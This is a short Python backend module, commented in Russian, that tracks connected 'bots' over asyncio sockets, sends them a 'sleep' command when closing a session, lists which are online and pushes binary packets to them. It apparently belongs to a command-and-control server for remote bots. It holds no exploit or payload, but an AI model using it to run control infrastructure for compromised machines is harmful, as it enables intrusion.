# backend/Services/ClientManager.py
import asyncio, logs.LoggerWrapper as logger
active_clients = {}

async def close_client(bot_id, send_sleep=True):
    "Завершение сессии конкретного бота"
    if not (session := active_clients.pop(bot_id, None)): return False
    reader, writer = session
    try:
        if send_sleep: (writer.write(b"sleep\n"), await writer.drain())
        writer.close(); await writer.wait_closed()
    except: pass
    finally: logger.Log.info(f"[-] Бот {bot_id} отключен")
    return True

async def close_all_clients():
    "Массовое отключение всех активных ботов"
    return len(await asyncio.gather(*[close_client(bid) for bid in list(active_clients.keys())]))

def list_clients():
    "Список ID онлайн-клиентов"
    return [{"id": bid, "status": "online"} for bid in active_clients]

async def send_binary_to_bot(bot_id, packet):
    "Отправка бинарных данных в сокет бота"
    if not (session := active_clients.get(bot_id)): return False
    try: (session[1].write(packet), await session[1].drain()); return True
    except Exception as error: logger.Log.error(f"[Manager] Send error {bot_id}: {error}"); return False